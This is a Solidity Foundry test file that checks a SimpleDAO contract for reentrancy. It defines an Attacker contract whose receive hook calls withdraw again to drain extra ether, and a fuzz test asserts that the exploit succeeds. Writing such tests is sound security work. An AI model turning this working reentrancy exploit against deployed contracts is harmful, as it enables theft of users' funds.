
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleDAO} from "../src/SimpleDAO.sol";

contract TestReentrancySimpleDAO is Test {
    SimpleDAO public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new SimpleDAO();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 3);

        _attacker.setupAttack{value: 2 * attackVal}(2 * attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    SimpleDAO public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = SimpleDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        _victim.donate{value: msg.value}(address(this));
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedAttackVal = val;

        _victim.withdraw(val);

        if (attackCallCount >= 2 && address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount == 1) {            
            _victim.withdraw(storedAttackVal);
        }
    }
}
